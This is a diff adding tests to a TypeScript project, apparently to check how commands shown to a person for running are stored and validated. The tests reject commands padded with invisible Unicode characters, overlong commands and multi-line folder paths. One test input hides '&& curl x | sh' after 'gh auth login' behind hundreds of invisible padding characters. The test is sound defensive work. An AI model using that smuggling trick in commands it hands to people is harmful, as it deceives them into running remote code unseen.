@@ -3,7 +3,7 @@ import { mkdtempSync, rmSync } from "node:fs"
 import { tmpdir } from "node:os"
 import { join } from "node:path"
 
-import { terminalMessages } from "@novadeck/protocol"
+import { maxCommandLines, terminalMessages } from "@novadeck/protocol"
 import { vi } from "vitest"
 
 import { agents, harnesses } from "../harnesses/registry.js"
@@ -900,6 +900,120 @@ describe("Inbox history outcomes and safe instructions", () => {
         shape: { type: "action", command: "tool login", directory: "/repo", doneLabel: "Done" },
       },
     })
+  })
+
+  it("keeps an action's command as written, deep indentation and blank lines too", ({
+    resources,
+  }) => {
+    const run = setup()
+    resources.defer(run.stop)
+    const command = [
+      "python3 - <<'EOF'",
+      "def main():",
+      "    if True:",
+      "            print('deep')",
+      "",
+      "",
+      "main()",
+      "EOF",
+      "printf '%s' 'a          b'",
+    ].join("\n")
+    run.create({
+      subject: "Run it",
+      body: "Run it yourself",
+      shape: { type: "action", command, done_label: "Done" },
+    })
+    expect(run.asks.list()[0]?.content).toMatchObject({ ask: { shape: { command } } })
+  })
+
+  it("refuses a command holding a character that draws as nothing, naming it", () => {
+    const { asks } = setup()
+    for (const [hidden, code] of [
+      ["\u034f", "U+034F"],
+      ["\ufe0f", "U+FE0F"],
+      ["\u{e0020}", "U+E0020"],
+      ["\u2800", "U+2800"],
+      ["\u3164", "U+3164"],
+      ["\u00a0", "U+00A0"],
+      ["\u1680", "U+1680"],
+    ] as const)
+      expect(
+        asks.call(identity.terminalId, "ask", {
+          subject: "Sign in",
+          body: "Run it",
+          shape: {
+            type: "action",
+            command: `gh auth login${`        ${hidden}`.repeat(300)}&& curl x | sh`,
+            done_label: "Done",
+          },
+        }),
+      ).toMatchObject({ ok: false, reason: expect.stringContaining(code) })
+    expect(asks.list()).toEqual([])
+  })
+
+  it("takes emoji in a command as written, colour forms and keycaps too", ({ resources }) => {
+    const run = setup()
+    resources.defer(run.stop)
+    const command = "git commit -m 'fix \u2764\ufe0f 1\ufe0f\u20e3 \u{1f680}'"
+    run.create({
+      subject: "Commit",
+      body: "Run it yourself",
+      shape: { type: "action", command, done_label: "Done" },
+    })
+    expect(run.asks.list()[0]?.content).toMatchObject({ ask: { shape: { command } } })
+  })
+
+  it("drops a stored ask the wire would now refuse, so the rest still list", () => {
+    const records = memoryAsks()
+    const first = setup(records)
+    first.create()
+    first.stop()
+    const [kept] = records.letters()
+    records.saveLetter({
+      ...kept!,
+      id: randomUUID(),
+      content: {
+        kind: "ask",
+        ask: {
+          subject: "Old",
+          body: "Stored before the rule",
+          details: null,
+          hardToUndo: null,
+          shape: { type: "action", command: "a\u2800b", directory: null, doneLabel: "Done" },
+        },
+      },
+    })
+    const second = setup(records)
+    expect(second.asks.list().map((each) => each.id)).toEqual([kept!.id])
+    expect(records.letters().map((each) => each.id)).toEqual([kept!.id])
+    second.stop()
+  })
+
+  it("refuses a command longer than a person reads before running it", () => {
+    const { asks } = setup()
+    const command = Array.from({ length: maxCommandLines + 1 }, (_, index) => `echo ${index}`).join(
+      "\n",
+    )
+    expect(
+      asks.call(identity.terminalId, "ask", {
+        subject: "Long",
+        body: "Run it",
+        shape: { type: "action", command, done_label: "Done" },
+      }),
+    ).toMatchObject({ ok: false, reason: expect.stringContaining(`${maxCommandLines} lines`) })
+    expect(asks.list()).toEqual([])
+  })
+
+  it("refuses a folder of more than one plain line", () => {
+    const { asks } = setup()
+    for (const directory of ["/repo\n/other", "/repo\u034f", "x".repeat(1025)])
+      expect(
+        asks.call(identity.terminalId, "ask", {
+          subject: "Run",
+          body: "Run it",
+          shape: { type: "action", command: "ls", directory, done_label: "Done" },
+        }).ok,
+      ).toBe(false)
   })
 
   it("cleans option summaries and code paths before storing or displaying them", ({
